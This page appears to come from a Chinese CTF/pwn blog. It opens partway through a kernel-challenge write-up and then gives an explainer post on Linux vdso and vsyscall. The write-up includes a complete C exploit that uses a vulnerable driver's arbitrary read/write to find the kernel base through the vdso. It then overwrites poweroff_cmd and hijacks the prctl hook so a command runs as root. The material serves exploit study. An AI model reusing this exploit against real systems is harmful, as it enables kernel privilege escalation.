<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /<span class="number">30</span>iw <span class="number">0xffffffffa3a9c4c0</span></span><br><span class="line">   <span class="number">0xffffffffa3a9c4c0</span>:	push   rbx</span><br><span class="line">   <span class="number">0xffffffffa3a9c4c1</span>:	mov    rdi,<span class="number">0xffffffffa4c3d1e0</span></span><br><span class="line">   <span class="number">0xffffffffa3a9c4c8</span>:	movzx  ebx,BYTE PTR [rip+<span class="number">0x1670401</span>]        # <span class="number">0xffffffffa510c8d0</span></span><br><span class="line">   <span class="number">0xffffffffa3a9c4cf</span>:	call   <span class="number">0xffffffffa3a9c050</span> <span class="comment">/* 调用run_cmd */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第一个 call 就会调用 <code>run_cmd</code>，所以第一个参数 <code>poweroff_cmd == rdi</code></li>
<li><code>poweroff_cmd_offset = 0xffffffffa4c3d1e0 - 0xffffffffa3a00000 = 0x123d1e0</code></li>
</ul>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    write_channel.id = channel_id;</span><br><span class="line">    write_channel.buf = (<span class="keyword">char</span>*)write_buff;</span><br><span class="line">    write_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd, channel_id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_channel</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> addr;</span><br><span class="line">    <span class="keyword">uint32_t</span> result;</span><br><span class="line">    <span class="keyword">int</span>* read_buff = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">uint64_t</span> vdso_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span> ,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/simp1e&quot;</span>, O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">        error(<span class="string">&quot;open dev error&quot;</span>);</span><br><span class="line"></span><br><span class="line">    alloc_channel.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    alloc_channel.id = <span class="number">-1</span>;</span><br><span class="line">    ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(alloc_channel.id == <span class="number">-1</span> )</span><br><span class="line">        error(<span class="string">&quot;alloc channel error&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;channel id: %d\n&quot;</span>,alloc_channel.id);</span><br><span class="line"></span><br><span class="line">    channel_id = alloc_channel.id;</span><br><span class="line"></span><br><span class="line">    shrink_channel.id = channel_id;</span><br><span class="line">    shrink_channel.size = <span class="number">0x100</span> + <span class="number">1</span>;</span><br><span class="line">    ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_channel);;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(addr=<span class="number">0xffffffff80000000</span>; addr&lt;<span class="number">0xffffffffffffefff</span>; addr+=<span class="number">0x1000</span>) &#123;</span><br><span class="line">        RAA(fd, channel_id, &amp;read_buff, addr, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (read_buff == <span class="number">0x010102464c457f</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;find it: %p\n&quot;</span>,addr);</span><br><span class="line">            vdso_addr = addr;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(vdso_addr==<span class="number">0</span>)</span><br><span class="line">        error(<span class="string">&quot;can&#x27;t find vdso_bsae&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base = vdso_addr - <span class="number">0x1020000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base addr: %lp\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> poweroff_work_func_offset = <span class="number">0x9c4c0</span>; </span><br><span class="line">    <span class="keyword">uint64_t</span> poweroff_cmd_offset = <span class="number">0x123d1e0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> prctl_hook_offset = <span class="number">0x124fd00</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> poweroff_work_func_addr = kernel_base + poweroff_work_func_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span> poweroff_cmd_addr = kernel_base + poweroff_cmd_offset;</span><br><span class="line">    <span class="keyword">uint64_t</span> task_prctl_hook_addr = kernel_base + prctl_hook_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> arbitrary_command[] = <span class="string">&quot;/bin/chmod 777 /flag&quot;</span>;</span><br><span class="line">    WAA(fd, channel_id, arbitrary_command, poweroff_cmd_addr, <span class="built_in">strlen</span>(arbitrary_command));</span><br><span class="line">    WAA(fd, channel_id, &amp;poweroff_work_func_addr, task_prctl_hook_addr, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    prctl(<span class="number">0</span> ,<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag: &quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>第一次遇到 HijackPrctl，最后的 exp 参考了下 raycp 大佬的思路</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/03/Linux%20vdso&vsyscall/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/03/Linux%20vdso&vsyscall/" class="post-title-link" itemprop="url">Linux vdso&vsyscall</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-03 21:00:16 / Modified: 21:00:52" itemprop="dateCreated datePublished" datetime="2022-10-03T21:00:16+08:00">2022-10-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>基础知识</strong></p>
<p>随便用 GDB 调试一个 ELF 文件，使用 <code>vmmap</code> 命令就可以找到它们：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x7ffff7fc9000</span>     <span class="number">0x7ffff7fcd000</span> r--p     <span class="number">4000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7fcd000</span>     <span class="number">0x7ffff7fcf000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7fcf000</span>     <span class="number">0x7ffff7fd0000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd0000</span>     <span class="number">0x7ffff7ff3000</span> r-xp    <span class="number">23000</span> <span class="number">1000</span>   /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ff3000</span>     <span class="number">0x7ffff7ffb000</span> r--p     <span class="number">8000</span> <span class="number">24000</span>  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">2</span>c000  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">2</span>d000  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      [anon_7ffff7ffe]</span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure>
<ul>
<li>vsyscall：第一种也是最古老的一种用于加快系统调用的机制<ul>
<li>它提供了一种在用户空间下快速执行系统调用的方法</li>
<li>Linux 内核在用户空间映射一个包含一些变量及一些系统调用的实现的内存页，对特定的系统调用使用函数调用进行代替（不必切换到内核态）</li>
</ul>
</li>
<li>vdso(virtual dynamic shared object)：vdso 是用来代替 vsyscall 的<ul>
<li>vsyscall 区域太小了，而且映射区域固定，有安全问题（为了兼容性考虑，vsyscall 还是存在）</li>
<li>vdso 其实是一个动态库，它由内核提供，映射到每个进程的地址空间，它将提供一些函数调用来替代系统调用</li>
<li>本质上 vdso 是一段内核空间的代码，映射给用户态使其更快地调用系统调用</li>
</ul>
</li>
<li>vvar：存放数据的地方，vdso 中的函数会使用 vvar 中的数据</li>
</ul>
<p><strong>vsyscall</strong></p>
<ul>
<li>Intel 最先实现了专门的快速系统调用指令 sysenter 和系统调用返回指令 sysexit</li>
<li>AMD 针锋相对地实现了另一组专门的快速系统调用指令 syscall 和系统调用返回指令 sysret</li>
</ul>
<p>vsyscall 机制的核心就在于：通过调用 <code>__kernel_vsyscall</code> 来确定到底应该执行 syscall/sysret 指令还是 sysenter/sysexit 指令 </p>
<ul>
<li><code>__kernel_vsyscall</code> 是一个特殊的页，其位于内核地址空间，但也是唯一允许用户访问的区域，该区域的地址固定为 <code>0xffffffffff600000</code>（64位系统），大小固定为4K（所有的进程都共享内核映射）</li>
<li><code>__kernel_vsyscall</code> 属于内核数据，用户态程序只能通过 ELF 辅助向量来获取其基地址（具体来说是  AT_SYSINFO）</li>
<li>在ELF辅助向量中找到 AT_SYSINFO 后，就会像传统系统调用一样，将系统调用号和参数写入寄存器中，调用 <code>__kernel_vsyscall</code> 函数（由它来判断执行 syscall 还是 sysenter）</li>
</ul>
<p>vsyscall 还可以对特定的系统调用使用函数调用进行代替，在 Linux 路径 <code>/usr/include/asm/vsyscall.h</code> 中可以看到如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _ASM_X86_VSYSCALL_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ASM_X86_VSYSCALL_H</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">vsyscall_num</span> &#123;</span></span><br><span class="line">	__NR_vgettimeofday, </span><br><span class="line">	__NR_vtime,</span><br><span class="line">	__NR_vgetcpu,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VSYSCALL_ADDR (-10UL &lt;&lt; 20)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* _ASM_X86_VSYSCALL_H */</span></span></span><br></pre></td></tr></table></figure>
<p>vsyscall 机制支持的系统调用有3个：</p>
<ul>
<li>gettimeofday()：把时间包装为一个结构体返回，包括秒，微妙，时区等信息</li>
<li>time()：获取当前的系统时间，返回一个大整数 </li>
<li>getcpu()：获取CPU信息</li>
</ul>
<p>这些函数都有一个特点：Root 用户和普通用户都会获得相同的结果（不存在安全问题）</p>
<ul>
<li>在内核与用户态之间建立一段共享内存区域，由内核定期“推送”最新值到该共享内存区域</li>
<li>当用户态程序在调用这些系统调用的时候，库函数并不真正执行系统调用，而是通过 vsyscall page（我们在GDB中看到的就是这个）来读取该数据的最新值</li>
<li>将系统调用改造成了函数调用，直接提升了执行性能（减少了内核的开销）</li>
</ul>
<p><strong>vdso</strong></p>
<p>vdso 是用来代替 vsyscall 的，它们的区别如下：</p>
<ul>
<li>vdso 本质上是一个ELF共享目标文件，而 vsyscall 只是一段内存代码和数据</li>
<li>vsyscall 位于内核地址空间，采用静态地址映射方式，而 vdso 借助共享目标文件天生具有的 PIC 特性，可以以进程为粒度动态映射到进程地址空间中</li>
</ul>
<p>通过 <code>ldd</code> 命令就可以轻松找到 vdso：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  exp ldd /bin/sh</span><br><span class="line">	linux-vdso.so.1 (0x00007ffe04dee000) # target</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f70dd181000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f70dd3ad000)</span><br></pre></td></tr></table></figure>
<ul>
<li>vdso mapping 的本体是一个ELF共享目标文件</li>
<li>源码位于 Linux 内核，路径为 <code>/arch/x86/entry/vdso</code></li>
<li>其中包括一小段汇编代码，一些C源文件和一个链接器脚本</li>
</ul>
<p>vdso 同样也拥有替代系统调用的能力，相关代码如下：（在上述路径的 <code>vdso.lds.S</code> 文件中）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * This controls what userland symbols we export from the vDSO.</span><br><span class="line"> */</span><br><span class="line">VERSION &#123;</span><br><span class="line">	LINUX_2.6 &#123;</span><br><span class="line">	global:</span><br><span class="line">		clock_gettime;</span><br><span class="line">		__vdso_clock_gettime;</span><br><span class="line">		gettimeofday;</span><br><span class="line">		__vdso_gettimeofday;</span><br><span class="line">		getcpu;</span><br><span class="line">		__vdso_getcpu;</span><br><span class="line">		time;</span><br><span class="line">		__vdso_time;</span><br><span class="line">	local: *;</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
<p>vdso 机制支持的系统调用有4个：</p>
<ul>
<li>gettimeofday()：把时间包装为一个结构体返回，包括秒，微妙，时区等信息</li>
<li>time()：获取当前的系统时间，返回一个大整数 </li>
<li>getcpu()：获取CPU信息</li>
<li>clock_gettime()：用于计算精度和纳秒</li>
</ul>
<p>其实现原理和 vsyscall 有所不同：</p>
<ul>
<li>当一个程序被加载时，动态链接器和加载器便会加载程序依赖的动态链接对象，也包括 vdso</li>
<li>当 glibc 解析ELF头部时，会存储有关于 vdso 的一些位置信息，也包括简短的 stub 函数，用来在真正执行系统调用前搜索 vdso 中的符号名</li>
<li>在 glibc 中的代码会在 vdso 中搜索对应的函数并且返回其地址，真正发挥作用的代码就被包装在 vdso 而不是在内核里，当然也就不需要系统调用了</li>
<li>vdso 需要用到的内核信息由 vvar mapping 提供，vdso 本身的地址则依靠 ELF 辅助向量进行传递（具体来说是 AT_SYSINFO_EHDR）</li>
</ul>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903429907677191#heading-26">Linux 系统调用权威指南</a> </li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/436454953">Linux vDSO概述</a> </li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/02/Linux%20%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%AE%80%E6%9E%90/" class="post-title-link" itemprop="url">Linux 内存模型简析</a>
        </h2>

